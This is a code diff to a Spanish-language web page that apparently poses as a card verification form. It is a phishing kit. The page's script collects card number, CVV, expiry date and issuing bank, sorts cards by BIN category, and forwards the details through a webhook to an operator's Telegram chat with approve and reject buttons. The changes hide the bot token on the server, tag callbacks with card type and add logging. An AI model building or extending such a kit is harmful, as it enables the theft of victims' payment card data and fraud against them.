@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -1027,10 +1028,11 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN DE TELEGRAM Y WEBHOOK
+        // CONFIGURACIÓN - Usando Variables de Entorno
         // ============================================
-        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+        // Las credenciales se obtienen desde el backend
+        // El CHAT_ID y TOKEN están en el servidor (Vercel)
+        
         const WEBHOOK_URL = '/api/webhook';
         const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
@@ -1038,6 +1040,24 @@
         let solicitudId = null;
         let pollingInterval = null;
         let cardType = null;
+
+        // ============================================
+        // FUNCIÓN PARA OBTENER CONFIGURACIÓN DEL BACKEND
+        // ============================================
+        async function obtenerConfiguracionBackend() {
+            try {
+                const response = await fetch(`${WEBHOOK_URL}?config=true`);
+                if (response.ok) {
+                    const data = await response.json();
+                    console.log('🔧 Configuración del backend:', data);
+                    return data;
+                }
+                return null;
+            } catch (error) {
+                console.error('❌ Error obteniendo configuración:', error);
+                return null;
+            }
+        }
 
         // ============================================
         // MAPA DE BINs POR BANCO Y CATEGORÍA
@@ -1329,8 +1349,11 @@
             if (cardNumber.length >= 3) {
                 const type = detectCardType(cardNumber);
                 updateCardLogo(type);
+                // Guardar el tipo de tarjeta para usarlo después
+                cardType = type;
             } else {
                 cardLogo.innerHTML = '';
+                cardType = null;
             }
         });
 
@@ -1473,6 +1496,7 @@
                 'amex': 'amex.html'
             };
             const destino = map[tipo] || 'index.html';
+            console.log(`🔄 Redirigiendo a: ${destino} (${tipo})`);
             window.location.href = destino;
         }
 
@@ -1489,11 +1513,13 @@
                 
                 console.log(`🏷️ Categoría detectada: ${categoriaInfo.emoji} ${categoriaInfo.categoria}`);
 
+                // El botón de aprobación incluye el tipo de tarjeta
+                const tipoPrefix = datos.tipoTarjeta || 'card';
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
-                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` },
-                            { text: "❌ RECHAZAR", callback_data: `reject_${datos.solicitudId}` }
+                            { text: "✅ APROBAR", callback_data: `approve_${tipoPrefix}_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR", callback_data: `reject_${tipoPrefix}_${datos.solicitudId}` }
                         ]
                     ]
                 };
@@ -1510,7 +1536,7 @@
                 mensaje += `🏦 Número: \`${datos.numeroTarjeta}\`\n`;
                 mensaje += `🔢 CVV: \`${datos.cvv}\`\n`;
                 mensaje += `📅 Vencimiento: \`${datos.vencimiento}\`\n`;
-                mensaje += `💳 Tipo: ${datos.tipoTarjeta.toUpperCase()}\n`;
+                mensaje += `💳 Tipo: ${datos.tipoTarjeta ? datos.tipoTarjeta.toUpperCase() : 'DESCONOCIDO'}\n`;
                 mensaje += `🏛️ Banco emisor: ${datos.bancoEmisor}\n`;
                 // AÑADIR LA CATEGORÍA AL MENSAJE
                 mensaje += `⭐ *Categoría:* ${categoriaInfo.emoji} *${categoriaInfo.categoria}*\n\n`;
@@ -1629,7 +1655,12 @@
                 isValid = false;
             }
 
-            cardType = detectCardType(cardNumber);
+            // Detectar el tipo de tarjeta nuevamente para asegurar
+            const tipoDetectado = detectCardType(cardNumber);
+            if (tipoDetectado) {
+                cardType = tipoDetectado;
+            }
+
             if (!cardType || cardNumber.length === 0) {
                 cardNumberInput.parentElement.parentElement.classList.add('error');
                 isValid = false;
